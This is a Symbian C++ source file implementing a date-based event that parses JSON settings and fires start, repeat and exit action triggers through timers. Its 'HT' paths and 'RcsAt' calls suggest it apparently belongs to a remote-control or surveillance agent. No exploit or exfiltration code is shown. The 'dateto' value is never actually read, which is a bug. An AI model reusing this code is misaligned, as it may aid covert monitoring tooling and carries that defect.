/*
 * EventDate.cpp
 *
 *  Created on: 21/dic/2011
 *      Author: Giovanna
 */

#include "EventDate.h"
#include <HT\TimeUtils.h>
	
#include "Json.h"

CEventDate::CEventDate(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Date, aTriggerId), iDateTo(ETrue)
	{
	// No implementation required
	}

CEventDate::~CEventDate()
	{
	__FLOG(_L("Destructor"));
	delete iTimer;
	delete iTimerTo;
	delete iTimerRepeat;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CEventDate* CEventDate::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventDate* self = new (ELeave) CEventDate(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventDate* CEventDate::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventDate* self = CEventDate::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}
 
void CEventDate::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventTimer.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	
	RBuf paramsBuf;
			
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
			
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("end"),iDateParams.iExitAction);
			}
		else
			iDateParams.iExitAction = -1;
			
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			//action
			rootObject->GetIntL(_L("repeat"),iDateParams.iRepeatAction);
			//iter
			if(rootObject->Find(_L("iter")) != KErrNotFound)
				rootObject->GetIntL(_L("iter"),iDateParams.iIter);
			else 
				iDateParams.iIter = -1;
			//delay
			if(rootObject->Find(_L("delay")) != KErrNotFound)
				rootObject->GetIntL(_L("delay"),iDateParams.iDelay);
			else 
				iDateParams.iDelay = -1;
			}
		else
			{
			iDateParams.iRepeatAction = -1;
			iDateParams.iIter = -1;
			iDateParams.iDelay = -1;
			}
		//retrieve date start
		TBuf<32> dateFrom;
		rootObject->GetStringL(_L("datefrom"),dateFrom);
		iTimeAt=TimeUtils::GetSymbianDate(dateFrom);
		//retrieve date to
		TBuf<32> dateTo;
		if(rootObject->Find(_L("dateto")) != KErrNotFound)
			{
			iTimeAtTo = TimeUtils::GetSymbianDate(dateTo);
			}
		else
			{
			iDateTo = EFalse;
			}
		//retrieve enable flag
		rootObject->GetBoolL(_L("enabled"),iEnabled);
				
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	
	iTimer = CTimeOutTimer::NewL(*this);
	if(iDateTo)
		iTimerTo = CTimeOutTimer::NewL(*this);
	else 
		iTimerTo = NULL;
	
	if((iDateParams.iRepeatAction != -1) && (iDateParams.iDelay != -1))
		{
		iTimerRepeat = CTimeOutTimer::NewL(*this);
		iSecondsIntervRepeat = iDateParams.iDelay;
		}
	else
		iTimerRepeat = NULL;
	}

void CEventDate::StartEventL()
	{
	__FLOG(_L("StartEventL"));
	__FLOG_2(_L("%d %d"), iTimerType, iSecondsInterv.Int()); 
	
	iEnabled = ETrue;
	
	// First we have to check if the date from is expired
	TTime now;
	now.UniversalTime();
	if (iTimeAt <= now)
		{
		// date expired, trigger start action
		TTimeIntervalSeconds secondsInterv = 1;
		iTimeAt.HomeTime();
		iTimeAt += secondsInterv;
		iTimer->RcsAt(iTimeAt);
		} 
	else 
		{
		iTimer->RcsAtUTC( iTimeAt ); 
		}
	// we have to check  if date to is expired
	if(iDateTo)
		{
		if (iTimeAtTo <= now)
			{
			// date expired, trigger exit action
			TTimeIntervalSeconds secondsInterv = 3;
			iTimeAtTo.HomeTime();
			iTimeAtTo += secondsInterv;
			iTimerTo->RcsAt(iTimeAtTo);
			} 
		else 
			{
			iTimerTo->RcsAtUTC( iTimeAtTo ); 
			}
		}
	}

void CEventDate::StopEventL()
	{
	iTimer->Cancel();
	if(iTimerTo != NULL)
		iTimerTo->Cancel();
	if(iTimerRepeat != NULL)
		iTimerRepeat->Cancel();
	iEnabled = EFalse;
	}


void CEventDate::TimerExpiredL(TAny* src)
	{
	__FLOG(_L("TimerExpiredL"));
	if(src == iTimer)
		{
		// trigger start action 
		SendActionTriggerToCoreL();
		// start repeat action
		if((iDateParams.iRepeatAction != -1) && (iDateParams.iDelay != -1))
			{
			iIter = iDateParams.iIter;
					
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->RcsAt(iTimeAtRepeat);
					
			--iIter;
					
			SendActionTriggerToCoreL(iDateParams.iRepeatAction);
			}
		return;	
		}
	if(src == iTimerTo)
		{
		// Stop the repeat action
		if(iTimerRepeat != NULL)
			iTimerRepeat->Cancel();
		// Triggers the exit action
		if (iDateParams.iExitAction != -1)
			{
			SendActionTriggerToCoreL(iDateParams.iExitAction);
			}
		return;
		}
	if(src == iTimerRepeat)
		{
		if(iDateParams.iIter == -1)
			{
			// infinite loop
			// restart timer
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->RcsAt(iTimeAtRepeat);
			SendActionTriggerToCoreL(iDateParams.iRepeatAction);
			}
		else
			{
			// finite loop
			if(iIter > 0)
				{
				// still something to do
				// restart timer
				iTimeAtRepeat.HomeTime();
				iTimeAtRepeat += iSecondsIntervRepeat;
				iTimerRepeat->RcsAt(iTimeAtRepeat);
				--iIter;
				SendActionTriggerToCoreL(iDateParams.iRepeatAction);
				}
			}
		}
	}
